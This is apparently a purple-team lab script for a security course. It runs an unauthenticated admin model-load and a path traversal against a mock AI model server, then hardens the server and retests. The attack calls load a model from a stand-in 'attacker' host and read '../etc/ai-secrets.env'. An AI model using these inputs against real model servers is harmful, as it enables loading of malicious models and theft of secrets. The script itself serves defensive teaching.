"""Lab 30 driver — exploit mock AI infrastructure, then harden and re-measure.

Run: py labs/module-30/infra_lab.py

Purple cycle: exploit unauth admin + path traversal on public services -> observe canary reached
-> harden (auth, block traversal, bind localhost) -> retest (attacks fail) -> adapt (attacker who
gains a localhost foothold) -> measure the residual and name the load-bearing control.
"""
from __future__ import annotations

import infra
from infra import Service


def exploit_admin(svc, source="attacker") -> bool:
    r = svc.admin_load_model(source, model_ref="http://attacker/evil-model", token=None)
    return r.get("status") == 200 and infra.CANARY in r.get("effect", "")


def exploit_traversal(svc, source="attacker") -> bool:
    r = svc.get_artifact(source, rel_path="../etc/ai-secrets.env", token=None)
    return r.get("status") == 200 and infra.CANARY in (r.get("body") or "")


def benign_use(svc, source="localhost") -> bool:
    # a legitimate, authenticated artifact read must still work after hardening
    r = svc.get_artifact(source, rel_path="readme.txt",
                         token=svc.valid_token if svc.require_auth else None)
    return r.get("status") == 200 and r.get("body") == "hello"


if __name__ == "__main__":
    print("=== STAGE 1: exploit VULNERABLE public services ===")
    s = Service("model-server", bind="public")
    print("   unauth admin model-load:", exploit_admin(s))
    print("   artifact path traversal:", exploit_traversal(s))

    print("\n=== STAGE 2: HARDENED (auth + block traversal + bind localhost) ===")
    h = Service("model-server", bind="localhost", require_auth=True, block_traversal=True)
    print("   unauth admin model-load:", exploit_admin(h))
    print("   artifact path traversal:", exploit_traversal(h))
    print("   legitimate authed read still works:", benign_use(h))

    print("\n=== STAGE 3: ADAPT — attacker gains a localhost foothold but no admin token ===")
    print("   (network reachable now, but auth + traversal-block still hold)")
    print("   admin without token:", exploit_admin(h, source="localhost"))
    print("   traversal from localhost:", exploit_traversal(h, source="localhost"))

    print("\n=== which single control is load-bearing per attack? ===")
    only_bind = Service("m", bind="localhost")                       # network only
    only_auth = Service("m", bind="public", require_auth=True)       # auth only
    only_path = Service("m", bind="public", block_traversal=True)    # traversal block only
    print("   bind=localhost alone blocks admin:", not exploit_admin(only_bind),
          "| traversal:", not exploit_traversal(only_bind))
    print("   auth alone blocks admin:", not exploit_admin(only_auth),
          "| traversal:", not exploit_traversal(only_auth))
    print("   traversal-block alone blocks traversal:", not exploit_traversal(only_path),
          "| admin:", not exploit_admin(only_path))
    print("\nVerdict: network exposure (bind) is the highest-leverage control — an unreachable service")
    print("is not attackable at all; auth and input validation are defence-in-depth for when it is reachable.")
